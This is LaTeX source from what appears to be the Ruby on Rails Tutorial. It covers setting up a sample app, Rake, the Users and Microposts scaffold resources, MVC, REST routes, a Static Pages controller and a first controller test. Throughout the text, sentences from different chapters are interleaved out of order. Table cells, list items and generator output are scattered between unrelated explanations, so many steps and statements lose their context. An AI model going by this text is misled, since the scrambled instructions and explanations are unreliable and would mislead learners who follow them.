<n><n>\section{Sample app setup} % (fold)<n>\label{sec:sample_app_setup}<n><n>As in Chapter~\ref{cha:a_toy_app}, before getting started we need to 
This simply updates the database with our new \kode{users} data model.
(We'll learn more about database migrations starting in Section~\ref{sec:database_migrations}.)
as shown in Listing~\ref{code:rails_new_sample_app}.
On many systems, including the cloud IDE, you can omit \kode{bundle exec}, but it is necessary on some systems, so I'll include it for completeness.
If you're using the cloud IDE, it's often useful to use the ``Goto Anything'' command, which makes it easy to navigate the filesystem by typing in partial filenames.
With that, we can run the local web server in a separate tab (Figure~\ref{fig:rails_server_new_tab}) as follows
In this context, having the hello, toy, and sample apps present in the same project can be inconvenient due to the many common filenames.
The \kode{rails} script is designed so that you don't need to use \kode{bundle exec}.
Thus, you may want to consider removing the first two apps before proceeding, which you can do by navigating to the \kode{workspace} directory and running \kode{rm -rf hello\_app/ toy\_app/} (Table~\ref{table:unix_commands}).
Now the toy application should be available on the local server as described in Section~\ref{sec:rails_server}.
(As long as you pushed the corresponding repositories up to Bitbucket, you can always recover them later.)
(If you're using the cloud IDE, be sure to open the resulting development server in a new \emph{browser} tab, not inside the IDE itself.)
In the Unix tradition, the \href{http://en.wikipedia.org/wiki/Make_(software)}{\emph{make}} utility has played an important role in building executable programs from source code; many a computer hacker has committed to muscle memory the line
Generating a new sample app.
<n>  $ ./configure && make && sudo make install
(As in Section~\ref{sec:planning_the_application}, note that users of the cloud IDE can create this project in the same workspace as the applications from the previous two chapters.
commonly used to compile code on Unix systems (including Linux and Mac OS~X).
It is not necessary to create a new workspace.)
Rake is \emph{Ruby make}, a make-like language written in Ruby.
Rails uses Rake extensively, especially for the innumerable little administrative tasks necessary when developing database-backed web applications.
Listing~\ref{code:gemfile_sample_app} is identical to Listing~\ref{code:gemfile_sqlite_version} and Listing~\ref{code:demo_gemfile_sqlite_version_redux} apart from the gems in the \kode{test} group, which are needed for the optional advanced testing setup (Section~\ref{sec:advanced_testing_setup}).
The \kode{rake db:migrate} command is probably the most common, but there are many others; you can see a list of database tasks using \kode{-T db}:
<n>  $ bundle exec rake -T db
\emph{Note}: If you would like to install \emph{all} the gems needed for the sample application, you should use the code in Listing~\ref{code:final_gemfile} at this time.
To see all the Rake tasks available, run
<n>  $ bundle exec rake -T
The list is likely to be overwhelming, but don't worry, you don't have to know all (or even most) of these commands.
By the end of the \emph{Rails Tutorial}, you'll know all the most important ones.
This arranges to skip the \texttt{pg} gem for PostgreSQL in development and use SQLite for development and testing.
If we visit the root URL at~/ (read ``slash'', as noted in Section~\ref{sec:hello_world}), we get the same default Rails page shown in Figure~\ref{fig:riding_rails}, but in generating the Users resource scaffolding we have also created a large number of pages for manipulating users.
Heroku recommends against using different databases in development and production, but for the sample application it won't make any difference, and SQLite is \emph{much} easier than PostgreSQL to install and configure locally
For example, the page for listing all users is at \href{http://localhost:3000/users}{/users}, and the<n>page for making a new user is at \href{http://localhost:3000/users/new}{/users/new}.
I recommend eventually learning how to install and configure PostgreSQL in development, but the chances are now is not that time.
The rest of this section is dedicated to taking a whirlwind tour through these user pages.
When the time comes, Google ``install configure postgresql <your system>'' and ``rails postgresql setup'' and prepare for a challenge.
As we proceed, it may help to refer to Table~\ref{table:user_urls}, which shows the correspondence between pages and URLs.
(On the cloud IDE, <your system> is Ubuntu.)
page to show user with id \kode{1}
page to make a new user
The correspondence between pages and URLs for the Users resource.
We start with the page to show all the users in our application, called \href{http://localhost:3000/users}{\texttt{index}}; as you might expect, initially there are no users at all (Figure~\ref{fig:demo_blank_user_index_rails_3}).
The initial index page for the Users resource (\href{http://localhost:3000/users}{/users}).
To make a new user, we visit the \href{http://localhost:3000/users/new}{\texttt{new}} page, as shown in Figure~\ref{fig:demo_new_user_rails_3}.
In Chapter~\ref{cha:sign_up}, this will become the user signup page.
$ bundle
The new user page (\href{http://localhost:3000/users/new}{/users/new}).
\label{fig:demo_new_user_rails_3}}<n>\end{figure}<n><n>\noindent 
We can create a user by entering name and email values in the text fields and then clicking the Create User button.
With that, all we have left is to initialize the Git repository
The result is the user \href{http://localhost:3000/users/1}{\texttt{show}} page, as seen in Figure~\ref{fig:demo_show_user_rails_3}.
As with the first application, I suggest updating the \kode{README} file (located in the root directory of the application) to be more helpful and descriptive.
(The green welcome message is accomplished using the \emph{flash}, which we'll learn about in Section~\ref{sec:the_flash}.)
We start by changing the format from RDoc to Markdown:
Note that the URL is \href{http://localhost:3000/users/1}{/users/1}; as you might suspect, the number~\kode{1} is simply the user's~\kode{id} attribute from Figure~\ref{fig:demo_user_model}.
In Section~\ref{sec:showing_users}, this page will become the user's profile.
We then fill it with the contents shown in Listing~\ref{code:sample_app_readme}.
The page to show a user (\href{http://localhost:3000/users/1}{/users/1}).
An improved \kode{README} file for the sample app.
To change a user's information, we visit the \href{http://localhost:3000/users/1/edit}{\texttt{edit}} page (Figure~\ref{fig:demo_edit_user_rails_3}).
# Ruby on Rails Tutorial: sample application<n><n>This is the sample application for the<n>[*Ruby on Rails Tutorial:<n>Learn Web Development with Rails*](http://www.railstutorial.org/)<n>by [Michael Hartl](http://www.michaelhartl.com/).
By modifying the user information and clicking the Update User button, we arrange to change the information for the user in the toy application (Figure~\ref{fig:demo_update_user_rails_3}).
Finally, we commit the changes:
(As we'll see in detail starting in Chapter~\ref{cha:modeling_users}, this user data is stored in a database back-end.)
You may recall from Section~\ref{sec:git_commands} that we used the Git command \kode{git commit -a -m "Message"}, with flags for ``all changes'' (\kode{-a}) and a message (\kode{-m}).
We'll add user edit/update functionality to the sample application in Section~\ref{sec:updating_users}.
As shown in the second command above, Git also lets us roll the two flags into one using \kode{git commit -am "Message"}.
The user edit page (\href{http://localhost:3000/users/1/edit}{/users/1/edit}).
Since we'll be using this sample app throughout the rest of the book, it's a good idea to \href{https://bitbucket.org/repo/create}{create a new repository at Bitbucket} and push it up:
A user with updated information.
As a result of my performing this step, you can find the \href{https://github.com/railstutorial/sample_app_rails_4}{Rails Tutorial sample application code on GitHub} (under the username \texttt{railstutorial} and the slightly different name \texttt{sample\_app\_rails\_4})
Now we'll create a second user by revisiting the \href{http://localhost:3000/users/new}{\texttt{new}} page and submitting a second set of user information; the resulting user \href{http://localhost:3000/users}{\texttt{index}} is shown in Figure~\ref{fig:demo_user_index_two_rails_3}.
To avoid integration headaches later on, it's also a good idea to deploy the app to Heroku even at this early stage.
Section~\ref{sec:showing_users} will develop the user index into a more polished page for showing all users.
As in Chapter~\ref{cha:beginning} and Chapter~\ref{cha:a_toy_app}, I suggest following the ``hello, world!''
The user index page (\href{http://localhost:3000/users}{/users}) with a second user.
in Listing~\ref{code:hello_action} and
Having shown how to create, show, and edit users, we come finally to destroying them (Figure~\ref{fig:demo_destroy_user}).
As noted in Chapter~\ref{cha:a_toy_app}, the main reason for this is that the default Rails page typically breaks at Heroku, which makes it hard to tell if the deployment was successful or not.
You should verify that clicking on the link in Figure~\ref{fig:demo_destroy_user} destroys the second user, yielding an index page with only one user.
 Then commit the changes and push up to Heroku:
(If it doesn't work, be sure that JavaScript is enabled in your browser; Rails uses JavaScript to issue the request needed to destroy a user.)
Section~\ref{sec:deleting_users} adds user deletion to the sample app, taking care to restrict its use to a special class of administrative users.
Destroying a user.
Now that we've completed a quick overview of the Users resource, let's examine one particular part of it in the context of the Model-View-Controller (MVC) pattern introduced in Section~\ref{sec:mvc}.
(As in Section~\ref{sec:deploying}, you may see some warning messages, which you should ignore for now.
Our strategy will be to describe the results of a typical browser hit---a visit to the user index page at \href{http://localhost:3000/users}{/users}---in terms of MVC (Figure~\ref{fig:mvc_detailed}).
We'll eliminate them in Section~\ref{sec:professional_grade_deployment}.)
Apart from the address of the Heroku app, the result should be the same as in Figure~\ref{fig:heroku_app}.
A detailed diagram of MVC in Rails.
Here is a summary of the steps shown in Figure~\ref{fig:mvc_detailed}:
The browser issues a request for the /users URL.
As you proceed through the rest of the book, I recommend pushing and deploying the application regularly, which automatically makes remote backups and lets you catch any production errors as soon as possible.
Rails routes /users to the \kode{index} action in the Users controller.
If you run into problems at Heroku, make sure to take a look at the production logs to try to diagnose the problem:
The \kode{index} action asks the User model to retrieve all users (\kode{User.all}).
\emph{Note}: If you do end up using Heroku for a real-life application, be sure to follow the production webserver configuration in Section~\ref{sec:professional_grade_deployment}.
The User model pulls all the users from the database.
With all the preparation from Section~\ref{sec:sample_app_setup} finished, we're ready to get started developing the sample application.
The User model returns the list of users to the controller.
Our method for making static pages is probably the simplest, but it's not the only way.
The controller captures the users in the \kode{@users} variable, which is passed to the \kode{index} view.
The optimal method really depends on your needs; if you expect a \emph{large} number of static pages, using a Static Pages controller can get quite cumbersome, but in our sample app we'll only need a few.
The view uses embedded Ruby to render the page as HTML.
If you do need a lot of static pages, take a look at the \href{https://github.com/thoughtbot/high_voltage}{\texttt{high\_voltage}} gem.
The controller passes the HTML back to the browser
For a dated but still useful discussion of this issue, see the \href{http://blog.hasmanythrough.com/2008/4/2/simple-pages}{simple pages post on hasmanythrough}.
Some references indicate that the view returns the HTML directly to the browser (via a web server such as Apache or Nginx).
We got a glimpse of controllers in Chapter~\ref{cha:a_toy_app}, and will come to a deeper understanding once we explore the \href{http://en.wikipedia.org/wiki/Representational_State_Transfer}{REST architecture} more fully (starting in Chapter~\ref{cha:modeling_users}).
Regardless of the implementation details, I prefer to think of the controller as a central hub through which all the application's information flows.
In order to get our bearings, it's helpful to recall the Rails directory structure from Section~\ref{sec:the_hello_application} (Figure~\ref{fig:directory_structure_rails}).
Now let's take a look at the above steps in more detail.
In this section, we'll be working mainly in the \kode{app/controllers} and \kode{app/views} directories.
We start with a request issued from the browser---i.e., the result of typing a URL in the address bar or clicking on a link (Step~1 in Figure~\ref{fig:mvc_detailed}).
Recall from Section~\ref{sec:git_commands} that, when using Git, it's a good practice to do our work on a separate topic branch rather than the master branch.
If you're using Git for version control, you should run the following command to checkout a topic branch for static pages:
The code to create the mapping of user URLs to controller actions for the Users resource appears in Listing~\ref{code:rails_routes}; this code effectively sets up the table of URL/action pairs seen in Table~\ref{table:user_urls}.
(The strange notation \kode{:users} is a \emph{symbol}, which we'll learn about in Section~\ref{sec:hashes_and_symbols}.)
static-pages
The Rails routes, with a rule for the Users resource.
(The first line here is just to make sure that you start on the master branch, so that the \kode{static-pages} topic branch is based on \kode{master}.
You can skip that command if you're already on the master branch.)
While we're looking at the routes file, let's take a moment to associate the root route with the users index, so that ``slash'' goes to /users.
Recall from Listing~\ref{code:hello_root_route} that we changed
To get started with static pages, we'll first generate a controller using the same Rails \kode{generate} script we used in Chapter~\ref{cha:a_toy_app} to generate scaffolding.
Since we'll be making a controller to handle static pages, we'll call it the Static Pages controller, designated by the \href{https://en.wikipedia.org/wiki/CamelCase}{CamelCase} name \kode{StaticPages}.
We'll also plan to make actions for a Home page, a Help page, and an About page, designated by the lower-case action names \kode{home}, \kode{help}, and \kode{about}.
so that the root route went to the \kode{hello} action in the Application controller.
The \kode{generate} script takes an optional list of actions, so we'll include actions for the Home and Help pages directly on the command line, while intentionally leaving off the action for the About page so that we can see how to add it (Section~\ref{sec:getting_started_with_testing}).
In the present case, we want to use the \kode{index} action in the Users controller, which we can arrange using the code shown in  Listing~\ref{code:rails_routes_root_route}.
The resulting command to generate the Static Pages controller appears in Listing~\ref{code:generating_pages}.
(At this point, I also recommend removing the \kode{hello} action from the Application controller if you added it at the beginning of this section.)
Generating a Static Pages controller.
Adding a root route for users.
The pages from the tour in Section~\ref{sec:a_user_tour} correspond to \emph{actions} in the Users \emph{controller}, which is a collection of related actions.
      create  app/controllers/static_pages_controller.rb
The controller generated by the scaffolding is shown schematically in Listing~\ref{code:demo_users_controller}.
Note the notation \kode{class UsersController < ApplicationController}, which is an example of a Ruby \emph{class} with \emph{inheritance}.
      create    app/views/static_pages
(We'll discuss inheritance briefly in Section~\ref{sec:inheritance_hierarchies} and cover both subjects in more detail in Section~\ref{sec:ruby_classes}.)
      create    app/views/static_pages/home.html.erb
The Users controller in schematic form.
      create    app/views/static_pages/help.html.erb
      create    app/helpers/static_pages_helper.rb
      create      app/assets/javascripts/static_pages.js.coffee
      create      app/assets/stylesheets/static_pages.css.scss
For clarity, this tutorial always uses the full command, but in real life most Rails developers use one or more of the shortcuts shown in Table~\ref{table:shortcuts}.
Full command
$ rails s
$ rails c
$ rails g
You may notice that there are more actions than there are pages; the \kode{index}, \kode{show}, \kode{new}, and \kode{edit} actions all correspond to pages from Section~\ref{sec:a_user_tour}, but there are additional \kode{create}, \kode{update}, and \kode{destroy} actions as well.
These actions don't typically render pages (although they can); instead, their main purpose is to modify information about users in the database.
$ rake test
Fielding, Roy Thomas.
$ rake
\emph{Architectural Styles and the Design of Network-based Software Architectures}.
Some Rails shortcuts.
Doctoral dissertation, University of California, Irvine, 2000.
Before moving on, if you're using Git it's a good idea to add the files for the Static Pages controller to the remote repository:
Note from Table~\ref{table:demo_RESTful_users} that there is some overlap in the URLs; for example, both the user \kode{show} action and the \kode{update} action correspond to the URL /users/1.
The difference between them is the \href{http://en.wikipedia.org/wiki/HTTP_request#Request_methods}{HTTP request method} they respond to.
The final command here arranges to push the \kode{static-pages} topic branch up to Bitbucket.
Subsequent pushes can omit the other arguments and write simply
We'll learn more about HTTP request methods starting in Section~\ref{sec:getting_started_with_testing}.
The commit and push sequence above represents the kind of pattern I would ordinarily follow in real-life development, but for simplicity I'll typically omit such intermediate commits from now on.
This is merely a convention, and in fact using snake case at the command line also works: the command
also generates a controller called \kode{static\_pages\_controller.rb}.
Because Ruby uses CamelCase for class names (Section~\ref{sec:ruby_classes}), my preference is to refer to controllers using their CamelCase names, but this is a matter of taste.
(Since Ruby filenames typically use snake case, the Rails generator converts CamelCase to snake case using the \href{http://api.rubyonrails.org/classes/ActiveSupport/Inflector.html#method-i-underscore}{\texttt{underscore}} method.)
By the way, if you ever make a mistake when generating code, it's useful to know how to reverse the process.
Undoing things
update user with id \kode{1}
Even when you're very careful, things can sometimes go wrong when developing Rails applications.
Happily, Rails has some facilities to help you recover.
delete user with id \kode{1}
One common scenario is wanting to undo code generation---for example, when you change your mind on the name of a controller and want to eliminate the generated files.
RESTful routes provided by the Users resource in Listing~\ref{code:rails_routes}.
Because Rails creates a substantial number of auxiliary files along with the controller (as seen in Listing~\ref{code:generating_pages}), this isn't as easy as removing the controller file itself; undoing the generation means removing not only the principal generated file, but all the ancillary files as well.
REpresentational State Transfer (REST)
(In fact, as we saw in Section~\ref{sec:demo_users_resource} and Section~\ref{sec:microposts_resource}, \texttt{rails generate} can make automatic edits to the \texttt{routes.rb} file, which we also want to undo automatically.)
If you read much about Ruby on Rails web development, you'll see a lot of references to ``REST'', which is an acronym for REpresentational State Transfer.
In Rails, this can be accomplished with \texttt{rails destroy} followed by the name of the generated element.
REST is an architectural style for developing distributed, networked systems and software applications such as the World Wide Web and web applications.
In particular, these two commands cancel each other out:
Earlier versions of Rails used \texttt{PUT} for data updates, but \texttt{PATCH} is the more appropriate method according to the HTTP standard.
<n>  $ rails generate controller StaticPages home help<n>  $ rails destroy  controller StaticPages home help
As a Rails application developer, the RESTful style of development helps you make choices about which controllers and actions to write: you simply structure the application using resources that get created, read, updated, and deleted.
Similarly, in Chapter~\ref{cha:modeling_users} we'll generate a \emph{model} as follows:
In the case of users and microposts, this process is straightforward, since they are naturally resources in their own right.
In Chapter~\ref{cha:following_users}, we'll see an example where REST principles allow us to model a subtler problem, ``following users'', in a natural and convenient way.
<n>  $ rails generate model User name:string email:string
To examine the relationship between the Users controller and the User model, let's focus on a simplified version of the \kode{index} action, shown in Listing~\ref{code:demo_index_action}.
(The scaffold code is ugly and confusing, so I've suppressed it.)
This can be undone using
The simplified user \kode{index} action for the toy application.
<n>  $ rails destroy model User
(In this case, it turns out we can omit the other command-line arguments.
This \kode{index} action has the line \kode{@users = User.all} (Step~3 in Figure~\ref{fig:mvc_detailed}), which asks the User model to retrieve a list of all the users from the database (Step~4), and then places them in the  variable \kode{@users} (pronounced ``at-users'') (Step~5).
The User model itself appears in Listing~\ref{code:demo_user_model}; although it is rather plain, it comes equipped with a large amount of functionality because of inheritance (Section~\ref{sec:inheritance_hierarchies} and Section~\ref{sec:ruby_classes}).
When you get to Chapter~\ref{cha:modeling_users}, see if you can figure out why.)
In particular, by using the Rails library called \emph{Active Record}, the code in Listing~\ref{code:demo_user_model} arranges for \kode{User.all} to return all the users in the database.
Another technique related to models involves undoing \emph{migrations}, which we saw briefly in Chapter~\ref{cha:a_toy_app} and will see much more of starting in Chapter~\ref{cha:modeling_users}.
The User model for the toy application.
Migrations change the state of the database using the command
Once the \kode{@users} variable is defined, the controller calls the \emph{view} (Step~6), shown in Listing~\ref{code:demo_index_view}.
<n>  $ bundle exec rake db:migrate
We can undo a single migration step using
Variables
<n>  $ bundle exec rake db:rollback
(Remember, you aren't supposed to understand this code right now.
To go all the way back to the beginning, we can use
It is shown only for purposes of illustration.)
<n>  $ bundle exec rake db:migrate VERSION=0
The view for the user index.
As you might guess, substituting any other number for \texttt{0} migrates to that version number, where the version numbers come from listing the migrations sequentially.
<table>
With these techniques in hand, we are well-equipped to recover from the inevitable development \href{http://en.wikipedia.org/wiki/Military_slang#SNAFU}{snafus}.
</tr>
The Static Pages controller generation in Listing~\ref{code:generating_pages} automatically updates the routes file (\kode{config/routes.rb}), which we saw briefly in Section~\ref{sec:hello_world}.
The routes file is responsible for implementing the router (seen in Figure~\ref{fig:mvc_detailed}) that defines the correspondence between URLs and web pages.
</table>
The routes file is located in the \kode{config} directory, where Rails collects files needed for the application configuration (Figure~\ref{fig:config_directory_rails}).
The view converts its contents to HTML (Step~7), which is then returned by the controller to the browser for display (Step~8).
Contents of the sample app's \kode{config} directory.
Though good for getting a general overview of Rails, the scaffold Users resource suffers from a number of severe weaknesses.
Since we included the \kode{home} and \kode{help} actions in Listing~\ref{code:generating_pages}, the routes file already has a rule for each one, as seen in Listing~\ref{code:pages_routes}.
No data validations.
The routes for the \kode{home} and \kode{help} actions in the Static Pages controller.
Our User model accepts data such as blank names and invalid email addresses without complaint.
Here the rule
Moreover, by using \kode{get} we arrange for the route to respond to a \texttt{GET} request, which is one of the fundamental
To see the result, start a Rails development server as described in Section~\ref{sec:rails_server}:
Then navigate to \href{http://localhost:3000/static_pages/home}{/static\_pages/home} (Figure~\ref{fig:raw_home_view}).
The raw home view (\href{http://localhost:3000/static_pages/home}{/static\_pages/home}).
\texttt{GET}, et cet.
The hypertext transfer protocol (\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods}{HTTP}) defines the basic operations \texttt{GET}, \texttt{POST}, \texttt{PATCH}, and \texttt{DELETE}. These refer to operations between a \emph{client} computer (typically running a web browser such as Chrome, Firefox, or Safari) and a \emph{server} (typically running a web server such as Apache or Nginx).
(It's important to understand that, when developing Rails applications on a local computer, the client and server are the same physical machine, but in general they are different.)
No authentication.
An emphasis on HTTP verbs is typical of web frameworks (including Rails) influenced by the \emph{REST architecture}, which we saw briefly in Chapter~\ref{cha:a_toy_app} and will start learning about more in Chapter~\ref{cha:sign_up}.
We have no notion of logging in or out, and no way to prevent any user from performing any operation.
\texttt{POST} is the next most common operation; it is the request sent by your browser when you submit a form.
No tests.
In Rails applications, \texttt{POST} requests are typically used for \emph{creating} things (although HTTP also allows \texttt{POST} to perform updates).
This isn't technically true---the scaffolding includes rudimentary tests---but the generated tests don't test for data validation, authentication, or any other custom requirements.
No style or layout.
For example, the \texttt{POST} request sent when you submit a registration form creates a new user on the remote site.
There is no consistent site styling or navigation.
The other two verbs, \texttt{PATCH} and \texttt{DELETE}, are designed for \emph{updating} and \emph{destroying} things on the remote server.
No real understanding.
These requests are less common than \texttt{GET} and \texttt{POST} since browsers are incapable of sending them natively, but some web frameworks (including Ruby on Rails) have clever ways of making it \emph{seem} like browsers are issuing such requests.
If you understand the scaffold code, you probably shouldn't be reading this book.
As a result, Rails supports all four of the request types \texttt{GET}, \texttt{POST}, \texttt{PATCH}, and \texttt{DELETE}.
<n>\end{itemize}<n><n>    % subsection weaknesses_of_the_users_resource (end)<n><n>  % section users_resource (end)<n><n>  \section{The Microposts resource} % (fold)<n>  \label{sec:microposts_resource}<n><n>
Having generated and explored the Users resource, we turn now to the associated Microposts resource.
To understand where this page comes from, let's start by taking a look at the Static Pages controller in a text editor, which should look something like Listing~\ref{code:static_pages_controller}.
Throughout this section, I recommend comparing the elements of the Microposts resource with the analogous user elements from Section~\ref{sec:demo_users_resource}; you should see that the two resources parallel each other in many ways.
You may note that, unlike the demo Users and Microposts controllers from Chapter~\ref{cha:a_toy_app}, the Static Pages controller does not use the standard REST actions.
The RESTful structure of Rails applications is best absorbed by this sort of repetition of form---indeed, seeing the parallel structure of Users and Microposts even at this early stage is one of the prime motivations for this chapter.
This is normal for a collection of static pages: the REST architecture isn't the best solution to every problem.
As with the Users resource, we'll generate scaffold code for the Microposts resource using \kode{rails generate scaffold}, in this case implementing the data model from Figure~\ref{fig:demo_micropost_model}
The Static Pages controller made by Listing~\ref{code:generating_pages}.
As with the User scaffold, the scaffold generator for microposts follows the singular convention of Rails models; thus, we have \kode{generate Micropost}.
Classes are simply a convenient way to organize \emph{functions} (also called \emph{methods}) like the \kode{home} and \kode{help} actions, which are defined using the \kode{def} keyword.
(We'll learn more about both classes and inheritance in Section~\ref{sec:ruby_classes}.)
      create    app/models/micropost.rb
In the case of the Static Pages controller, both of its methods are initially empty:
In plain Ruby, these methods would simply do nothing.
      create      test/models/micropost_test.rb
In Rails, the situation is different---\kode{StaticPagesController} is a Ruby class, but because it inherits from \kode{ApplicationController} the behavior of its methods is specific to Rails: when visiting the URL /static\_pages/home, Rails looks in the Static Pages controller and executes the code in the \kode{home} action, and then renders the \emph{view} (the V in MVC from Section~\ref{sec:mvc}) corresponding to the action.
      create      test/fixtures/microposts.yml
So, what does a view look like, and how do we find it?
       route    resources :microposts
We'll learn in Section~\ref{sec:slightly_dynamic_pages} what the \kode{.erb} part means; from the \kode{.html} part you probably won't be surprised that it basically looks like HTML (Listing~\ref{code:raw_home_view}).
      create    app/controllers/microposts_controller.rb
The generated view for the Home page.
The view for the \kode{help} action is analogous (Listing~\ref{code:raw_help_view}).
      create      app/views/microposts
The generated view for the Help page.
      create      app/views/microposts/index.html.erb
Both of these views are just placeholders: they have a top-level heading (inside the \kode{h1} tag) and a paragraph (\kode{p} tag) with the full path to the corresponding file.
      create      app/views/microposts/edit.html.erb
      create      app/views/microposts/show.html.erb
We'll add some (very slightly) dynamic content starting in Section~\ref{sec:slightly_dynamic_pages}, but as they stand the views in Listing~\ref{code:raw_home_view} and Listing~\ref{code:raw_help_view} underscore an important point: Rails views can simply contain static HTML. This means we can begin customizing the Home and Help pages even with no knowledge of Rails, as shown in Listing~\ref{code:custom_home_page} and Listing~\ref{code:custom_help_page}.
      create      app/views/microposts/new.html.erb
Custom HTML for the Home page.
      create      app/views/microposts/_form.html.erb
      create      test/controllers/microposts_controller_test.rb
Custom HTML for the Help page.
      create      app/helpers/microposts_helper.rb
<n>  Get help on the Ruby on Rails Tutorial at the
<n>  To get help on this sample app, see the
      create        test/helpers/microposts_helper_test.rb
      create      app/views/microposts/index.json.jbuilder
The results of Listing~\ref{code:custom_home_page} and Listing~\ref{code:custom_help_page} are shown in Figure~\ref{fig:custom_home_page} and Figure~\ref{fig:custom_help_page}.
      create      app/views/microposts/show.json.jbuilder
A custom Home page.
A custom Help page.
Having created and filled in the Home and Help pages for our sample app (Section~\ref{sec:custom_static_pages}), now we're going to add an About page as well.
      create      app/assets/javascripts/microposts.js.coffee
When making a change of this nature, it's a good practice to write an \emph{automated test} to verify that the feature is implemented correctly.
      create      app/assets/stylesheets/microposts.css.scss
Developed over the course of building an application, the resulting \emph{test suite} serves as a safety net and as executable documentation of the application source code.
When done right, writing tests also allows us to develop \emph{faster} despite requiring extra code, because we'll end up wasting less time trying to track down bugs.
   identical    app/assets/stylesheets/scaffolds.css.scss
This is true only once we get good at writing tests, though, which is one reason it's important to start practicing as early as possible.
(If you get an error related to Spring, just run the command again.)
Although virtually all Rails developers agree that testing is a good idea, there is a diversity of opinion on the details.
To update our database with the new data model, we need to run a migration as in Section~\ref{sec:demo_users_resource}:
When to test
==  CreateMicroposts: migrating ===============================================
When deciding when and how to test, it's helpful to understand \emph{why} to test. In my view, writing automated tests has three main benefits:
-- create_table(:microposts)
Tests protect against \emph{regressions}, where a functioning feature stops working for some reason.
   -> 0.0023s
Tests allow code to be \emph{refactored} (i.e., changing its form without changing its function) with greater confidence.
==  CreateMicroposts: migrated (0.0026s) ======================================
Tests act as a \emph{client} for the application code, thereby helping determine its design and its interface with other parts of the system.
Now we are in a position to create microposts in the same way we created users in Section~\ref{sec:a_user_tour}.
Although none of the above benefits \emph{require} that tests be written first, there are many circumstances where test-driven development (TDD) is a valuable tool to have in your kit.
as seen in Listing~\ref{code:demo_microposts_resource}.
Deciding when and how to test depends in part on how comfortable you are writing tests; many developers find that, as they get better at writing tests, they are more inclined to write them first.
The scaffold code may have extra newlines compared to Listing~\ref{code:demo_microposts_resource}.
It also depends on how difficult the test is relative to the application code, how precisely the desired features are known, and how likely the feature is to break in the future.
This is not a cause for concern, as Ruby ignores extra newlines.
In this context, it's helpful to have a set of guidelines on when we should test first (or test at all).
The Rails routes, with a new rule for Microposts resources.
Here are some suggestions based on my own experience:
When a test is especially short or simple compared to the application code it tests, lean toward writing the test first.
/microposts
When the desired behavior isn't yet crystal clear, lean toward writing the application code first, then write a test to codify the result.
page to list all microposts
Because security is a top priority, err on the side of writing tests of the security model first.
/microposts/1
Whenever a bug is found, write a test to reproduce it and protect against regressions, then write the application code to fix it.
page to show micropost with id \kode{1}
Lean against writing tests for code (such as detailed HTML structure) likely to change in the future.
/microposts/new
page to make a new micropost
Write tests before refactoring code, focusing on testing error-prone code that's especially likely to break.
In practice, the guidelines above mean that we'll usually write controller and model tests first and integration tests (which test functionality across models, views, and controllers) second.
create a new micropost
And when we're writing application code that isn't particularly brittle or error-prone, or is likely to change (as is often the case with views), we'll often skip testing altogether.
/microposts/1/edit
Our main testing tools will be \emph{controller tests} (starting in this section), \emph{model tests} (starting in Chapter~\ref{cha:modeling_users}), and \emph{integration tests} (starting in Chapter~\ref{cha:sign_up}).
page to edit micropost with id \kode{1}
Integration tests are especially powerful, as they allow us to simulate the actions of a user interacting with our application using a web browser.
update micropost with id \kode{1}
Integration tests will eventually be our primary testing technique, but controller tests give us an easier place to start.
<n><n>  \subsection{Our first test} % (fold)<n>  \label{sec:our_first_test}<n><n>
Now it's time to add an About page to our application.
delete micropost with id \kode{1}
We'll then use the failing test to drive the writing of the application code.
RESTful routes provided by the Microposts resource in Listing~\ref{code:demo_microposts_resource}.
Getting started with testing can be challenging, requiring extensive knowledge of both Rails and Ruby.
The Microposts controller itself appears in schematic form Listing~\ref{code:demo_microposts_controller}.
At this early stage, writing tests might thus seem hopelessly intimidating.
in Listing~\ref{code:demo_users_controller}.
Luckily, Rails has already done the hardest part for us, because \kode{rails generate controller} (Listing~\ref{code:generating_pages}) automatically generated a test file to get us started:
This is a reflection of the REST architecture common to both resources.
Let's take a look at it (Listing~\ref{code:default_controller_test}).
The Microposts controller in schematic form.
The default tests for the StaticPages controller. 
It's not important at this point to understand the syntax in Listing~\ref{code:default_controller_test} in detail, but we can see that there are two tests, one for each controller action we included on the command line in Listing~\ref{code:generating_pages}.
Each test simply gets an action and verifies (via an \emph{assertion}) that the result is a success.
The response \kode{:success} is an abstract representation of the underlying HTTP \href{http://en.wikipedia.org/wiki/List_of_HTTP_status_codes}{status code} (in this case, \href{http://en.wikipedia.org/wiki/List_of_HTTP_status_codes#2xx_Success}{200 OK}).
In other words, a test like
To begin our testing cycle, we need to run our test suite to verify that the tests currently pass.
As noted in Section~\ref{sec:demo_users_resource}, the use of \kode{bundle exec} is unnecessary on some systems, including the cloud IDE recommended in Section~\ref{sec:development_environment}, but I include it for completeness.
In practice, my usual algorithm is to omit \kode{bundle exec} unless I get an error, in which case I re-try with \kode{bundle exec} and see if it works.
$ bundle exec rake test<n>2 tests, 2 assertions, 0 failures, 0 errors, 0 skips
As required, initially our test suite is passing (\passing).
By the way, the tests take some time to start, which is due to two factors: (1) starting the \emph{Spring server} to preload parts of the Rails environment, which only happens the first time; and (2) overhead associated with Ruby startup time.
(The second factor is ameliorated when using Guard as suggested in Section~\ref{sec:guard}.)
Because many testing tools represent failing tests with the color red and passing tests with the color green, this sequence is sometimes known as the ``Red, Green, Refactor'' cycle.
To make some actual microposts, we enter information at the new microposts page, \href{http://localhost:3000/microposts/new}{/microposts/new}, as seen in Figure~\ref{fig:demo_new_micropost}.
By default, \kode{rake test} shows red when the tests fail, but doesn't show green when the tests pass.
To arrange for a true Red--Green cycle, see Section~\ref{sec:minitest_reporters}.
The new micropost page (\href{http://localhost:3000/microposts/new}{/microposts/new}).
Our first step is to write a failing test for the About page.
At this point, go ahead and create a micropost or two, taking care to make sure that at least one has a \kode{user\_id} of~\kode{1} to match the id of the first user created in Section~\ref{sec:a_user_tour}.
Following the models from Listing~\ref{code:default_controller_test}, you can probably guess the right test, which is shown in Listing~\ref{code:about_test}.
The result should look something like Figure~\ref{fig:demo_micropost_index}.
A test for the About page. 
The micropost index page (\href{http://localhost:3000/microposts}{/microposts}).
\failing \\ \filepath{test/controllers/static\_pages\_controller\_test.rb}}<n>%= lang:ruby, options: "hl_lines": [15, 16, 17, 18]<n>\begin{code}<n>require 'test_helper'<n><n>class StaticPagesControllerTest < ActionController::TestCase<n><n>  test "should get home" do<n>    get :home<n>    assert_response :success
Any \emph{micro}post worthy of the name should have some means of enforcing the length of the post.
Constraining microposts to be at most 140 characters.
